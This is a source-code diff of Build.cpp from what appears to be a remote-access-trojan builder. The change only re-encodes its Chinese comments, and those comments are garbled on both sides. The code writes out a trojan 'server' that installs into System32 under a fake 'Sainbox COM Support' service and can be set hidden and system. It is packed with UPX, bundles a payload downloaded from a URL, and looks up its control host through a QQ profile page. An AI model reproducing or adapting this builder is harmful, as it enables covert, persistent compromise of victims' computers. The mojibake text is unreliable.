@@ -1,4 +1,4 @@
-// Build.cpp : implementation file
+ï»¿// Build.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -28,12 +28,12 @@ CBuild::CBuild(CWnd* pParent /*=NULL*/)
 {
 	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_Build));
 	//{{AFX_DATA_INIT(CBuild)
-	m_lanpenetrate = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "LanPenetrate", FALSE); //ÊÇ·ñÊ¹ÓÃÁËÄÚÍø´©Í¸
-	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", TRUE); //ÂÌÉ«°²×°
-	m_upx = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "UPX", FALSE); //ÊÇ·ñÑ¹Ëõ
-	m_azzds = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Azzds", 0); //°²×°Ôö´ó
-	m_kbcheck = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "KbChk", FALSE); //ÊÇ·ñÀ¦°ó
-	m_edit_kb = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "KbUrl", "http://www.baidu.com/1.jpg"); //À¦°óµØÖ·
+	m_lanpenetrate = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "LanPenetrate", FALSE); //æ˜¯å¦ä½¿ç”¨äº†å†…ç½‘ç©¿é€
+	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", TRUE); //ç»¿è‰²å®‰è£…
+	m_upx = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "UPX", FALSE); //æ˜¯å¦å‹ç¼©
+	m_azzds = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Azzds", 0); //å®‰è£…å¢å¤§
+	m_kbcheck = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "KbChk", FALSE); //æ˜¯å¦æ†ç»‘
+	m_edit_kb = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "KbUrl", "http://www.baidu.com/1.jpg"); //æ†ç»‘åœ°å€
 	//}}AFX_DATA_INIT
 }
 
@@ -102,7 +102,7 @@ char *StrAdd()	// GetVolumeInformation + GetComputerName
 	DWORD dwPcName = 256;
 	BOOL nRet = GetComputerName(szPcName, &dwPcName);
 	
-	//»ñµÃÇı¶¯Æ÷ĞòÁĞºÅ   
+	//è·å¾—é©±åŠ¨å™¨åºåˆ—å·   
 	LPCTSTR lpRootPathName = "C:\\";
 	char szVolumeNameBuffer[12];  
 	DWORD nVolumeNameSize = 12;   
@@ -113,7 +113,7 @@ char *StrAdd()	// GetVolumeInformation + GetComputerName
 	DWORD nFileSystemNameSize = 10;   
 	GetVolumeInformation(lpRootPathName,szVolumeNameBuffer,nVolumeNameSize,&VolumeSerialNumber,     
 		&MaximumComponentLength,&FileSystemFlags,szFileSystemNameBuffer,nFileSystemNameSize);   
-	//ÏÔÊ¾Çı¶¯Æ÷ĞòÁĞºÅ   
+	//æ˜¾ç¤ºé©±åŠ¨å™¨åºåˆ—å·   
 	CString   str;   
 	str.Format("%x%s",VolumeSerialNumber, szPcName);
 	return (char *)(LPCTSTR)str;
@@ -138,13 +138,13 @@ BOOL CBuild::OnInitDialog()
 		
 		UpdateData(false);
 		
-		m_dns1 = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Dns1", IP); //ÓòÃûIP(1)ÉÏÏß
-		m_dns2 = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Dns2", ""); //QQºÅÂë(2)ÉÏÏß
-		m_port1 = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8080); //ÉÏÏß¶Ë¿Ú1
-		m_port2 = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8080); //ÉÏÏß¶Ë¿Ú2
-		m_remote_path = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","InstallPath","%SystemRoot%\\System32\\");//°²×°Ä¿Â¼
-		m_dllname = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "DllName", "sainbox.exe"); //°²×°Ãû³Æ
-		m_FileAttribute.SetCurSel(((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "FileAttribute", 0)); //ÎÄ¼şÊôĞÔ
+		m_dns1 = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Dns1", IP); //åŸŸåIP(1)ä¸Šçº¿
+		m_dns2 = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Dns2", ""); //QQå·ç (2)ä¸Šçº¿
+		m_port1 = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8080); //ä¸Šçº¿ç«¯å£1
+		m_port2 = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8080); //ä¸Šçº¿ç«¯å£2
+		m_remote_path = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","InstallPath","%SystemRoot%\\System32\\");//å®‰è£…ç›®å½•
+		m_dllname = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "DllName", "sainbox.exe"); //å®‰è£…åç§°
+		m_FileAttribute.SetCurSel(((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "FileAttribute", 0)); //æ–‡ä»¶å±æ€§
 		
 		char szSvcName[] = "Sainbox";
 		char szSvcDisp[] = "Sainbox COM Support";
@@ -209,8 +209,8 @@ BOOL CBuild::OnInitDialog()
 	
 	UpdateData(false);
 	
-	m_log.ReplaceSel("=> ·şÎñÉú³É×¼±¸¾ÍĞ÷£¡...\r\n");
-	m_log.ReplaceSel("=> ÇëÈ·ÈÏÅäÖÃÎÄ¼şÊÇ·ñ´æÔÚ£¬·ñÔò»áÌáÊ¾ÄÚ´æ²»×ã£¡...\r\n");
+	m_log.ReplaceSel("=> æœåŠ¡ç”Ÿæˆå‡†å¤‡å°±ç»ªï¼...\r\n");
+	m_log.ReplaceSel("=> è¯·ç¡®è®¤é…ç½®æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦åˆ™ä¼šæç¤ºå†…å­˜ä¸è¶³ï¼...\r\n");
 	
 	SetIcon(m_hIcon, TRUE);			// Set big icon
 	SetIcon(m_hIcon, FALSE);		// Set small icon
@@ -231,10 +231,10 @@ MODIFY_DATA modify_data =
 	"",
 	"",
 	"",
-	FALSE,			//FALSEÎªÎ´Ê¹ÓÃÄÚÍø´©Í¸
-	TRUE,			//TRUEÎª·şÎñÆô¶¯
-	TRUE,			//TRUEÎªÆô¶¯Ä¿Â¼Æô¶¯
-	TRUE,			//TRUEÎªÂÌÉ«°²×°£¬FALSEÎª±ê×¼°²×°
+	FALSE,			//FALSEä¸ºæœªä½¿ç”¨å†…ç½‘ç©¿é€
+	TRUE,			//TRUEä¸ºæœåŠ¡å¯åŠ¨
+	TRUE,			//TRUEä¸ºå¯åŠ¨ç›®å½•å¯åŠ¨
+	TRUE,			//TRUEä¸ºç»¿è‰²å®‰è£…ï¼ŒFALSEä¸ºæ ‡å‡†å®‰è£…
 	"",
 	"",
 	0,
@@ -362,14 +362,14 @@ void CBuild::OnBuild()
 	
 	if (strHost1.IsEmpty()&&strHost2/*|| strPort*/.IsEmpty() )
 	{
-		AfxMessageBox("ÇëÌîĞ´ÖÁÉÙ1¸öÉÏÏßĞÅÏ¢",MB_ICONERROR);
+		AfxMessageBox("è¯·å¡«å†™è‡³å°‘1ä¸ªä¸Šçº¿ä¿¡æ¯",MB_ICONERROR);
 		return;
 	}
 	
 	((CComboBox*)GetDlgItem(IDC_ONLINE_GROUP))->GetWindowText(strGroup);
 	if (strGroup.IsEmpty())
 	{
-		AfxMessageBox("ÇëÍêÕûÌîĞ´·Ö×éÃû",MB_ICONERROR);
+		AfxMessageBox("è¯·å®Œæ•´å¡«å†™åˆ†ç»„å",MB_ICONERROR);
 		return;
 	}
 	
@@ -378,34 +378,34 @@ void CBuild::OnBuild()
 	
 	if(!m_green)
 	{
-		if (OnInstallWay == "·şÎñÆô¶¯ÔËĞĞ")
+		if (OnInstallWay == "æœåŠ¡å¯åŠ¨è¿è¡Œ")
 		{
 			if (strSer.IsEmpty() || strSerDis.IsEmpty() || strSerDes.IsEmpty() )
 			{
-				AfxMessageBox("ÇëÍêÕûÌîĞ´·şÎñÆô¶¯ĞÅÏ¢",MB_ICONERROR);
+				AfxMessageBox("è¯·å®Œæ•´å¡«å†™æœåŠ¡å¯åŠ¨ä¿¡æ¯",MB_ICONERROR);
 				return;
 			}
 		}
 	}
 	
-	m_log.ReplaceSel("=> ·şÎñ¶ËÉú³É³ÌĞòÕıÔÚ³õÊ¼»¯...\r\n");
+	m_log.ReplaceSel("=> æœåŠ¡ç«¯ç”Ÿæˆç¨‹åºæ­£åœ¨åˆå§‹åŒ–...\r\n");
 	
 	ZeroMemory(&modify_data,sizeof(MODIFY_DATA));
 	
 	strcpy(modify_data.szDns1,strHost1.GetBuffer(0));
 	strcpy(modify_data.szDns2,strHost2.GetBuffer(0));
-	modify_data.dwPort1 = atoi((LPCSTR)strPort1);   // ÉÏÏß¶Ë¿Ú1
-	modify_data.dwPort2 = atoi((LPCSTR)strPort2);   // ÉÏÏß¶Ë¿Ú2
+	modify_data.dwPort1 = atoi((LPCSTR)strPort1);   // ä¸Šçº¿ç«¯å£1
+	modify_data.dwPort2 = atoi((LPCSTR)strPort2);   // ä¸Šçº¿ç«¯å£2
 	strcpy(modify_data.szGroup,MyEncode(strGroup.GetBuffer(0)));
 	strcpy(modify_data.szVersion,MyEncode(strVersion.GetBuffer(0)));
 	strcpy(modify_data.SerName, strSer.GetBuffer(0));
 	strcpy(modify_data.Serdisplay, strSerDis.GetBuffer(0));
 	strcpy(modify_data.Serdesc, strSerDes.GetBuffer(0));
 	strcpy(modify_data.szGetGroup, strGetGroupName.GetBuffer(0));
-	strcpy(modify_data.ReleasePath,strReleasepath.GetBuffer(0));   //Ğ´Èë°²×°Â·¾¶
-	strcpy(modify_data.ReleaseName,strDllName.GetBuffer(0));   //Ğ´Èë°²×°Ãû³Æ
+	strcpy(modify_data.ReleasePath,strReleasepath.GetBuffer(0));   //å†™å…¥å®‰è£…è·¯å¾„
+	strcpy(modify_data.ReleaseName,strDllName.GetBuffer(0));   //å†™å…¥å®‰è£…åç§°
 	modify_data.bLanPenetrate = m_lanpenetrate;
-	modify_data.Dele_zd = (WORD)m_azzds;    //°²×°Ôö´ó
+	modify_data.Dele_zd = (WORD)m_azzds;    //å®‰è£…å¢å¤§
 	
 	if (!m_edit_kb.IsEmpty() && m_kbcheck)
 	{
@@ -415,26 +415,26 @@ void CBuild::OnBuild()
  	CString szTemp;
 	GetDlgItemText(IDC_FILEATTRIBUTE,szTemp);
 	
-	if(szTemp == "Õı³£")
+	if(szTemp == "æ­£å¸¸")
 		modify_data.FileAttribute = FILE_ATTRIBUTE_NORMAL;
-	if(szTemp == "Òş²Ø")
+	if(szTemp == "éšè—")
 		modify_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN;
 
-	if(szTemp == "ÏµÍ³")
+	if(szTemp == "ç³»ç»Ÿ")
 		modify_data.FileAttribute = FILE_ATTRIBUTE_SYSTEM;
 
-	if(szTemp == "Ö»¶Á")
+	if(szTemp == "åªè¯»")
 		modify_data.FileAttribute = FILE_ATTRIBUTE_READONLY;
 
-	if(szTemp == "Òş²Ø+ÏµÍ³")
+	if(szTemp == "éšè—+ç³»ç»Ÿ")
 		modify_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
 
-	if(szTemp == "Òş²Ø+ÏµÍ³+Ö»¶Á")
+	if(szTemp == "éšè—+ç³»ç»Ÿ+åªè¯»")
 		modify_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;
 	
-	m_log.ReplaceSel("=> ÉÏÏß¼°°²×°ĞÅÏ¢ÕıÔÚ×éºÏ...\r\n");
+	m_log.ReplaceSel("=> ä¸Šçº¿åŠå®‰è£…ä¿¡æ¯æ­£åœ¨ç»„åˆ...\r\n");
 	
-	//ÅĞ¶ÏÊÇ·ñ¼ÓÁË
+	//åˆ¤æ–­æ˜¯å¦åŠ äº†
 	WORD Tail = strlen(modify_data.ReleasePath)-1;
 	
 	if(modify_data.ReleasePath[Tail]!='\\')
@@ -443,7 +443,7 @@ void CBuild::OnBuild()
 		SetDlgItemText(IDC_COMBO_RELEASEPATH,modify_data.ReleasePath);
 	}
 	
-	//ÅĞ¶ÏÊÇ·ñÓĞ¶à²ãÄ¿Â¼
+	//åˆ¤æ–­æ˜¯å¦æœ‰å¤šå±‚ç›®å½•
 	CHAR *Judge = strstr(modify_data.ReleasePath,"\\");
 	if(Judge)
 	{
@@ -463,8 +463,8 @@ void CBuild::OnBuild()
 					CHAR *Judge5=strstr(Judge4,"\\");
 					if (Judge5)
 					{
-						m_log.ReplaceSel("=> Ä¿Â¼²»ºÏ·¨!ÎÒ´´½¨Ä¿Â¼ºÜĞÁ¿à!...\r\n");
-				        MessageBox("Ä¿Â¼²»ºÏ·¨!ÎÒ´´½¨Ä¿Â¼ºÜĞÁ¿à!");
+						m_log.ReplaceSel("=> ç›®å½•ä¸åˆæ³•!æˆ‘åˆ›å»ºç›®å½•å¾ˆè¾›è‹¦!...\r\n");
+				        MessageBox("ç›®å½•ä¸åˆæ³•!æˆ‘åˆ›å»ºç›®å½•å¾ˆè¾›è‹¦!");
 			         	return;
 					}
 				
@@ -473,9 +473,9 @@ void CBuild::OnBuild()
 		}
 	}
 	
-	m_log.ReplaceSel("=> ÇëÑ¡ÔñÉú³ÉÍ¾¾¶,ÎÄ¼şÃû³Æ¼°ÎÄ¼şºó×º!...\r\n");
+	m_log.ReplaceSel("=> è¯·é€‰æ‹©ç”Ÿæˆé€”å¾„,æ–‡ä»¶åç§°åŠæ–‡ä»¶åç¼€!...\r\n");
 	
-	if (OnInstallWay == "·şÎñÆô¶¯ÔËĞĞ")
+	if (OnInstallWay == "æœåŠ¡å¯åŠ¨è¿è¡Œ")
 	{
 		m_Servers = TRUE;
 		m_RunS = FALSE;
@@ -483,7 +483,7 @@ void CBuild::OnBuild()
 		modify_data.bRuns = m_RunS;
 	}
 	
-	if (OnInstallWay == "Æô¶¯Ä¿Â¼ÔËĞĞ")
+	if (OnInstallWay == "å¯åŠ¨ç›®å½•è¿è¡Œ")
 	{
 		m_Servers = FALSE;
 		m_RunS = TRUE;
@@ -493,7 +493,7 @@ void CBuild::OnBuild()
 	
 	modify_data.bRunOnce = m_green;
 	
-	CFileDialog dlg(FALSE, "exe", "1", OFN_OVERWRITEPROMPT,"¿ÉÖ´ĞĞÎÄ¼ş(*.exe)|*.exe|DOS¿ì½İ·½Ê½|*.pif|ÆÁÄ»±£»¤³ÌĞò (*.scr)|*.scr|Åú´¦Àí (*.bat)|*.bat|DOSÓ¦ÓÃ³ÌĞò(*.com)|*.com|All Files (*.*)|*.*||", NULL);
+	CFileDialog dlg(FALSE, "exe", "1", OFN_OVERWRITEPROMPT,"å¯æ‰§è¡Œæ–‡ä»¶(*.exe)|*.exe|DOSå¿«æ·æ–¹å¼|*.pif|å±å¹•ä¿æŠ¤ç¨‹åº (*.scr)|*.scr|æ‰¹å¤„ç† (*.bat)|*.bat|DOSåº”ç”¨ç¨‹åº(*.com)|*.com|All Files (*.*)|*.*||", NULL);
 	if(dlg.DoModal () != IDOK)
 		return;
 	
@@ -512,8 +512,8 @@ void CBuild::OnBuild()
 	delete[] str;
 	if (dwOffset == -1)
 	{
-		m_log.ReplaceSel("=> ·şÎñ¶ËÉú³ÉÊ§°Ü!Éú³ÉÎÄ¼ş±»Õ¼ÓÃ»òÎÄ¼ş²»ºÏ·¨!\r\n");
-		AfxMessageBox("Éú³ÉÎÄ¼ş±»Õ¼ÓÃ»òÎÄ¼ş²»ºÏ·¨!");
+		m_log.ReplaceSel("=> æœåŠ¡ç«¯ç”Ÿæˆå¤±è´¥!ç”Ÿæˆæ–‡ä»¶è¢«å ç”¨æˆ–æ–‡ä»¶ä¸åˆæ³•!\r\n");
+		AfxMessageBox("ç”Ÿæˆæ–‡ä»¶è¢«å ç”¨æˆ–æ–‡ä»¶ä¸åˆæ³•!");
 		return;
 	}
 	
@@ -530,8 +530,8 @@ void CBuild::OnBuild()
 		}
 		catch(...)
 		{
-			m_log.ReplaceSel("=> ·şÎñ¶ËÉú³ÉÊ§°Ü!\r\n");
-			MessageBox("ÎÄ¼ş±£´æÊ§°Ü£¬Çë¼ì²é","ÌáÊ¾",MB_OK|MB_ICONSTOP);
+			m_log.ReplaceSel("=> æœåŠ¡ç«¯ç”Ÿæˆå¤±è´¥!\r\n");
+			MessageBox("æ–‡ä»¶ä¿å­˜å¤±è´¥ï¼Œè¯·æ£€æŸ¥","æç¤º",MB_OK|MB_ICONSTOP);
 			DeleteFile(szFilePath);
 			return;
 		}
@@ -542,24 +542,24 @@ void CBuild::OnBuild()
 	
 	if (((CButton *)GetDlgItem(IDC_UPX))->GetCheck() == TRUE)//m_upx
 	{
-		CompressUpx(dlg.GetFileName());//UPXÑ¹Ëõ		
+		CompressUpx(dlg.GetFileName());//UPXå‹ç¼©		
 	}
 	
 // 	CString SCminc;
 // 	if (m_upx)
 // 	{	
-// 		if(CompressUpx(szFilePath))//UPXÑ¹Ëõ
-// 			SCminc="ÎÄ¼şÑ¹Ëõ³É¹¦!";
+// 		if(CompressUpx(szFilePath))//UPXå‹ç¼©
+// 			SCminc="æ–‡ä»¶å‹ç¼©æˆåŠŸ!";
 // 		else
-// 			SCminc="ÎÄ¼şÑ¹ËõÊ§°Ü!";
+// 			SCminc="æ–‡ä»¶å‹ç¼©å¤±è´¥!";
 // 		
 // 	}
 // 	else
 // 	{
-// 		SCminc="ÎÄ¼şÉú³É³É¹¦!";
+// 		SCminc="æ–‡ä»¶ç”ŸæˆæˆåŠŸ!";
 // 	}
 
-	//±£´æÅäÖÃĞÅÏ¢
+	//ä¿å­˜é…ç½®ä¿¡æ¯
 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "LanPenetrate", m_lanpenetrate);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Dns1", strHost1);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Dns2", strHost2);
@@ -567,22 +567,22 @@ void CBuild::OnBuild()
 	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Port2", strPort2);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Version", strVersion);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "Green", m_green);
-	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "UPX", m_upx); //UPXÑ¹Ëõ
-	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "InstallMode", m_insatll_way.GetCurSel()); //°²×°Ä£Ê½
+	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "UPX", m_upx); //UPXå‹ç¼©
+	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "InstallMode", m_insatll_way.GetCurSel()); //å®‰è£…æ¨¡å¼
 	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceName", strSer);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DisplayName", strSerDis);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Description", strSerDes);
-	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "InstallPath", m_remote_path);  //°²×°Ä¿Â¼
-	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DllName", m_dllname);  //°²×°Ãû³Æ
-	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "FileAttribute", m_FileAttribute.GetCurSel()); //ÎÄ¼şÊôĞÔ
-	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "Azzds", m_azzds);     //°²×°Ôö´ó
+	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "InstallPath", m_remote_path);  //å®‰è£…ç›®å½•
+	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DllName", m_dllname);  //å®‰è£…åç§°
+	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "FileAttribute", m_FileAttribute.GetCurSel()); //æ–‡ä»¶å±æ€§
+	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "Azzds", m_azzds);     //å®‰è£…å¢å¤§
 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "KbChk", m_kbcheck);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "KbUrl", m_edit_kb);
 	
 	char ShowText[200];
-	m_log.ReplaceSel("=> ÎÄ¼şÉú³É³É¹¦£¡, ÒÑÉú³É·şÎñ³ÌĞò...\r\n");
-	wsprintf(ShowText, "%s[%s]", "Éú³É³É¹¦:", szFilePath);
-	MessageBox(ShowText, "ÌáÊ¾", MB_ICONINFORMATION); //µ¯³öÌáÊ¾¿ò
+	m_log.ReplaceSel("=> æ–‡ä»¶ç”ŸæˆæˆåŠŸï¼, å·²ç”ŸæˆæœåŠ¡ç¨‹åº...\r\n");
+	wsprintf(ShowText, "%s[%s]", "ç”ŸæˆæˆåŠŸ:", szFilePath);
+	MessageBox(ShowText, "æç¤º", MB_ICONINFORMATION); //å¼¹å‡ºæç¤ºæ¡†
 	
 	OnOK();
 }
@@ -594,18 +594,18 @@ void CBuild::CompressUpx(CString inpath)
 	DWORD dwSize,dwWritten;
 	LPBYTE p;
 	HANDLE hFile;
-	// ²éÕÒËùĞèµÄ×ÊÔ´
+	// æŸ¥æ‰¾æ‰€éœ€çš„èµ„æº
 	hResInfo = FindResource(NULL,MAKEINTRESOURCE(IDR_UPX),"UPX");
 	if(hResInfo == NULL) return;
-	// »ñµÃ×ÊÔ´³ß´ç
+	// è·å¾—èµ„æºå°ºå¯¸
 	dwSize = SizeofResource(NULL,hResInfo);
-	// ×°ÔØ×ÊÔ´
+	// è£…è½½èµ„æº
 	hResData = LoadResource(NULL,hResInfo);
 	if(hResData == NULL) return;
-	// ÎªÊı¾İ·ÖÅä¿Õ¼ä
+	// ä¸ºæ•°æ®åˆ†é…ç©ºé—´
 	p = (LPBYTE)GlobalAlloc(GPTR, dwSize); 
 	if (p == NULL)     return;
-	// ¸´ÖÆ×ÊÔ´Êı¾İ
+	// å¤åˆ¶èµ„æºæ•°æ®
 	MoveMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
 	
 	char Path[256];
@@ -660,7 +660,7 @@ void CBuild::OnSelchangeInstallWay()
 	
 	m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay); 
 	
-	if (OnInstallWay == "·şÎñÆô¶¯ÔËĞĞ")
+	if (OnInstallWay == "æœåŠ¡å¯åŠ¨è¿è¡Œ")
 	{
 		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(TRUE);
 		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(TRUE);
@@ -669,7 +669,7 @@ void CBuild::OnSelchangeInstallWay()
 		GetDlgItem(IDC_DLL_NAME)->EnableWindow(TRUE);
 		GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(TRUE);
 	}
-	if (OnInstallWay == "Æô¶¯Ä¿Â¼ÔËĞĞ")
+	if (OnInstallWay == "å¯åŠ¨ç›®å½•è¿è¡Œ")
 	{
 		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
 		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
@@ -689,7 +689,7 @@ void CBuild::OnTestMaster()
 
 	if (!m_dns1.GetLength() || !m_port1)
 	{
-		MessageBox("ÇëÍêÕûÌîĞ´ÓòÃûIPÉÏÏßĞÅÏ¢", "ÌáÊ¾", MB_ICONSTOP);
+		MessageBox("è¯·å®Œæ•´å¡«å†™åŸŸåIPä¸Šçº¿ä¿¡æ¯", "æç¤º", MB_ICONSTOP);
 		return;
 	}
 
@@ -709,10 +709,10 @@ void Encrypt1(char *szData, int Size)
 #include <afxwin.h>
 #include <afxinet.h>
 
-enum DEL_CACHE_TYPE //ÒªÉ¾³ıµÄÀàĞÍ¡£
+enum DEL_CACHE_TYPE //è¦åˆ é™¤çš„ç±»å‹ã€‚
 {
-	File,  //±íÊ¾internetÁÙÊ±ÎÄ¼ş
-	Cookie //±íÊ¾Cookie
+	File,  //è¡¨ç¤ºinternetä¸´æ—¶æ–‡ä»¶
+	Cookie //è¡¨ç¤ºCookie
 };
 
 #define SWEEP_BUFFER_SIZE			10000
@@ -792,7 +792,7 @@ BOOL EmptyDirectory(LPCTSTR szPath, BOOL bDeleteDesktopIni, BOOL bWipeIndexDat)
 		sFullPath += _T('\\');
 		sFullPath += wfd.cFileName;
 		
-		//È¥µôÖ»¶ÁÊôĞÔ
+		//å»æ‰åªè¯»å±æ€§
 		dwAttributes = GetFileAttributes(sFullPath);
 		if (dwAttributes & FILE_ATTRIBUTE_READONLY)
 		{
@@ -871,30 +871,30 @@ void CBuild::TestQQToIP(LPCSTR ch,UINT nPort)
  	char abc[MAX_PATH]={0};
 	wsprintf (abc, "http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=%s",ch);
 	
-	// //ÇåinternetÁÙÊ±ÎÄ¼ş
+	// //æ¸…internetä¸´æ—¶æ–‡ä»¶
 	char szPath[MAX_PATH];
 	DeleteUrlCache(File);
-	if (SHGetSpecialFolderPath(NULL, szPath, CSIDL_INTERNET_CACHE, FALSE)) //µÃµ½ÁÙÊ±Ä¿Â¼£¬²¢Çå¿ÕËü
+	if (SHGetSpecialFolderPath(NULL, szPath, CSIDL_INTERNET_CACHE, FALSE)) //å¾—åˆ°ä¸´æ—¶ç›®å½•ï¼Œå¹¶æ¸…ç©ºå®ƒ
 	{
 		EmptyDirectory(szPath);
 	}
 	
-	char	chBuff1[300*1024] = {0};    //»ñÈ¡µ½µÄÄÚÈİ  
+	char	chBuff1[300*1024] = {0};    //è·å–åˆ°çš„å†…å®¹  
 	
 	CString myData;
 	char *ip_start = NULL;
 	CInternetSession mySession(NULL,0);
 	CHttpFile* ChinazHttpFile = NULL;
-	ChinazHttpFile = 	(CHttpFile*)mySession.OpenURL(abc);//strÊÇÒª´ò¿ªµÄµØÖ·  
-	while(ChinazHttpFile->ReadString(myData)) 		//ÖğĞĞ¶ÁÈ¡Ò³ÃæÊı¾İ   
+	ChinazHttpFile = 	(CHttpFile*)mySession.OpenURL(abc);//stræ˜¯è¦æ‰“å¼€çš„åœ°å€  
+	while(ChinazHttpFile->ReadString(myData)) 		//é€è¡Œè¯»å–é¡µé¢æ•°æ®   
 	{
 		strcpy (chBuff1, myData.GetBuffer(0));
 		if(strstr(chBuff1,"0,\"")!= 0)
 		{
-			char *ip_stop=strstr(chBuff1,"\",0]");//IP¶ËÎ²²¿Ö¸Õë¸³Öµ
-			*ip_stop='\0';//½Ø¶Ï
+			char *ip_stop=strstr(chBuff1,"\",0]");//IPç«¯å°¾éƒ¨æŒ‡é’ˆèµ‹å€¼
+			*ip_stop='\0';//æˆªæ–­
 			
-			ip_start=strstr(chBuff1,"0,\"")+3;//ip¶Î¿ªÊ¼²¿·ÖÖ¸Õë¸³Öµ
+			ip_start=strstr(chBuff1,"0,\"")+3;//ipæ®µå¼€å§‹éƒ¨åˆ†æŒ‡é’ˆèµ‹å€¼
 			break;
 		}
 	}
@@ -908,7 +908,7 @@ void CBuild::TestQQToIP(LPCSTR ch,UINT nPort)
 		CString str;
 		str = ip_start;
 		Encrypt1(str.GetBuffer(0) ,str.GetLength()); 
-		CString	strResulr = "Á¬½ÓÊ§°Ü";
+		CString	strResulr = "è¿æ¥å¤±è´¥";
 		bool	bRet = true;
 		WSADATA	wsaData0;
 		WSAStartup(0x0201, &wsaData0);
@@ -916,11 +916,11 @@ void CBuild::TestQQToIP(LPCSTR ch,UINT nPort)
 		SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if (sRemote == SOCKET_ERROR)
 		{ 
-			MessageBox("QQÉÏÏß(2)ÉÏÏß-³õÊ¼»¯Ê§°Ü", "ÌáÊ¾", MB_ICONSTOP);
+			MessageBox("QQä¸Šçº¿(2)ä¸Šçº¿-åˆå§‹åŒ–å¤±è´¥", "æç¤º", MB_ICONSTOP);
 			WSACleanup();
 			return ;
 		}
-		// ÉèÖÃsocketÎª·Ç×èÈû
+		// è®¾ç½®socketä¸ºéé˜»å¡
 		u_long argp	= 1;
 		ioctlsocket(sRemote, FIONBIO, &argp);
 		
@@ -936,7 +936,7 @@ void CBuild::TestQQToIP(LPCSTR ch,UINT nPort)
 			goto fail;
 		}
 		
-		// ¹¹Ôìsockaddr_in½á¹¹
+		// æ„é€ sockaddr_inç»“æ„
 		sockaddr_in	ClientAddr;
 		memset(&ClientAddr,0,sizeof(ClientAddr)); 
 		ClientAddr.sin_family	= AF_INET;
@@ -959,10 +959,10 @@ fail:
 		closesocket(sRemote);
 		WSACleanup();
 		
-		strResult.Format("QQÉÏÏß(2)ÉÏÏßĞÅÏ¢£º\nÓòÃû IP£º%s\nÁ¬½Ó¶Ë¿Ú£º%d", str, nPort);
+		strResult.Format("QQä¸Šçº¿(2)ä¸Šçº¿ä¿¡æ¯ï¼š\nåŸŸå IPï¼š%s\nè¿æ¥ç«¯å£ï¼š%d", str, nPort);
 		if (bRet)
 		{
-			strResulr = "Á¬½Ó³É¹¦";
+			strResulr = "è¿æ¥æˆåŠŸ";
 			MessageBox(strResult,strResulr,MB_ICONINFORMATION);
 		}
 		else
